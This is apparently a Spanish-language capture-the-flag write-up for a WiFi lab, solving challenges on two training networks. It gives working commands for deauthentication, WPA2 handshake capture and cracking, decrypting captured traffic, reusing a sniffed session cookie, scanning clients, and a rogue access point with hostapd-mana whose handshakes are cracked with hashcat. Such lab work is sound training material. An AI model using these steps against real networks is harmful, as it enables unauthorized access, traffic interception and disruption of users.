# Challenges PSK

En este capítulo vamos a realizar los siguientes retos:

* Challenge 08 - ¿Cuál es la contraseña del punto de acceso wifi-mobile?
* Challenge 09 - ¿Cuál es la IP del servidor web en la red wifi-mobile?
* Challenge 10 - ¿Cuál es la flag después de iniciar sesión en wifi-mobile?
* Challenge 11 - ¿Existe aislamiento de clientes en la red wifi-mobile?
* Challenge 12 - ¿Cuál es la contraseña de wifi-offices?

***

## Challenge 08

* ¿Cuál es la contraseña del punto de acceso wifi-mobile?

Activamos el modo monitor

```bash
## Detener NertworkManager para evitar conflicto con las interfaces
systemctl stop NetworkManager
## Activamos la interfaz y ponemos en modo monitor
# Desactivamos la interfaz {wlan0}
ip link set wlan0 down 
# Modo monitor {wlan0}
iwconfig wlan0 mode monitor
# Activamos la interfaz {wlan0}
ip link set wlan0 up
# Comprobamos modo monitor {wlan0}
iwconfig wlan0
```

Escanemos todas la redes hasta encontrar el BSSID y channel de la wifi-mobile -->

```
airodump-ng wlan0
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora escaneamos exclusiviamente ese canal y ese bssid -->

```
airodump-ng wlan0 --band bag -c 6 --bssid F0:9F:C2:71:22:12 -w /home/user/wifi/PSK/wifi-mobile
```

<figure><img src="../../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Para obtener el handshake, debemos esperar a que un cliente se autentifique solo a la red, o hacer un ataque de des autentificación -->

### Espera del handshake

<figure><img src="../../../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Ataque de des autentificación

```
aireplay-ng -0 10 -a F0:9F:C2:71:22:12 -c 28:6C:07:6F:F9:43 wlan0
```

* `-0 10` : 10 siendo la cantidad de paquetes que queremos mandar para des autentificar
* `-a` : El BSSID de la red / wifi-mobile
* `-c` : La MAC de un usuario conectado a esa red

<figure><img src="../../../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

> TAMBIEN se puede hacer sin especificar la MAC "-c" para des autentificar a todo los usuarios de la red, solo que algunos AP da problemas: `aireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0`

Ahora vemos que en la seccion `NOTES : EAPOL` por que tenemos el handshake de esos usuarios

<figure><img src="../../../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utilizamos `aircrack-ng` para romper la contraseña del `handshake`, previamente habiendo capturado el trafico con `airodump-ng` -->

```
aircrack-ng -w /root/rockyou-top100000.txt wifi-mobile-02.cap
```

<figure><img src="../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 09

* ¿Cuál es la IP del servidor web en la red wifi-mobile?

Tras tener la clave de la wifi y el handshake, podemos descifrar todo el trafico previamente recogido y verlo con `airdecap-ng` -->

```
airdecap-ng -e wifi-mobile -p starwars1 wifi-mobile-02.cap
```

* `-e` : Nombre de la wifi/bssid
* `-p` : Contraseña crackeada
* `.cap` : Trafico y handshake capturado

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

> Vemos que se ha `descifrado 5402 paquetes` y este nuevo archivo descifrado se guarda como&#x20;
>
> `-dec`

Ahora abrimos con wireshark para leer le trafico:

```
wireshark wifi-mobile-02-dec.cap
```

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

Vemos mucho trafico TCP y entre ello, conexiones a la `192.168.2.1` (siendo este el servidor/router)

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

Viendo asi el panel de login del router y como un usaurio esta dentro con un COOKIE seteada

***

## Challenge 10&#x20;

* ¿Cuál es la flag después de iniciar sesión en wifi-mobile?

Ahora sabieno la ip y la cookie, solo nos queda conectarnos con wpa\_supplicant y lo configuramos con la info del AP para conectarnos -->

```
## Creamos el archivo wpa_supplicant
nano wifi-mobile.conf
## Configuramos
network={
        ssid="wifi-mobile"
        psk="starwars1"
        scan_ssid=1
        key_mgmt=WPA-PSK
        proto=WPA2
}
## Nos conectamos con wpa_supplicant a la red
wpa_supplicant -i wlan2 -c wifi-mobile.conf
```

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Ahora utilizamos `dhclient` para obtener IP -->

```
dhclient -v wlan2
```

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

Apuntamos a la web `192.168.2.1:80` desde el navegador -->

<figure><img src="../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

No tenemos usuario y contraseña pero si una `COOKIE` de session obtenida con el wireshark, que modificamos, reemplazamos y reinicamos la web -->

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

> Esto funciona porla la cookie en la web esta mal configurada con un `HttpOnly=false`

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 11

* ¿Existe aislamiento de clientes en la red wifi-mobile?

Para saber esto, una vez conetados, podemos lanzar un escaneo a la red con arp-scan para ver los equipos conectados:

```
arp-scan -I wlan2 -l
```

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Ahora podemos lanzar un nmap al `192.168.2.7` para ver que puertos tiene abiertos -->

```
nmap -p- --open -sS 192.168.2.7 -n -Pn
############################################
PORT   STATE SERVICE
80/tcp open  http
```

Ahora siendo que tiene una web por detrás, podemos hacer un `curl` o ir directamente del el `navegador`:

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

***

## Challenge 12&#x20;

* ¿Cuál es la contraseña de wifi-offices?

Al escanear los APs, vemos que existen dos usuarios conectados una `wifi-officies`, pero no vemos el `AP` ni su `BSSID` -->

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Asi que podemos hacer un ataque de `NO AP`, con `hostapd-mana`

### Hostapd-mana

<pre class="language-bash"><code class="lang-bash">## Creamos un fichero de hostapd
nano wifi-offices-hostapd.conf
## Configuramos
<strong>interface=wlan1
</strong>driver=nl80211
hw_mode=g
channel=1
ssid=wifi-offices
mana_wpaout=hostapd.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
## Ejecutamos hostapd-mana
hostapd-mana wifi-offices-hostapd.conf
</code></pre>

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Con esto obtenemos el handshake de dos usuarios conectados. Y ahora podemos coger solo el hash con `awk` -->

```
cat hostapd.hccapx | awk '{print $3}' > wifi-offices-hostapd.22000
```

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Ahora en formato `22000`, podemos pasarselo a `hashcat` para crackear la contraseña -->

<pre><code><strong>hashcat -a 0 -m 22000 wifi-offices-hostapd.22000 /root/rockyou-top100000.txt --force
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
